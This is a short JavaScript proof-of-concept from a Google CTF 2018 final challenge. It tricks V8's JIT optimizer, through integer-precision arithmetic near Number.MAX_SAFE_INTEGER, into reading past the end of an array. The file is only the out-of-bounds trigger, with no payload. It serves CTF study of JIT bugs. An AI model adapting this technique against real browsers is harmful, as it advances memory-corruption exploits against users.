/*************************************************************
 * File Name: poc.js
 * 
 * Created on: 2020-02-01 19:37:10
 * Author: raycp
 * 
 * Last Modified: 2020-02-04 01:17:01
 * Description: poc for just in time game in google ctf 2018 final
************************************************************/
function foo(flag)
{
    let a = new Array(1.1,1.2,1.3,1.4,1.5); 
    let x = (flag == "foo") ? Number.MAX_SAFE_INTEGER+5:Number.MAX_SAFE_INTEGER+1;
    let tmp1 = x+1+1; // trigger reduce here
    let idx = tmp1 - (Number.MAX_SAFE_INTEGER+1); 
    
    return a[idx]; // out of bound here
}
console.log(foo("foo"));
console.log(foo(""));
%OptimizeFunctionOnNextCall(foo);
console.log(foo("foo"));
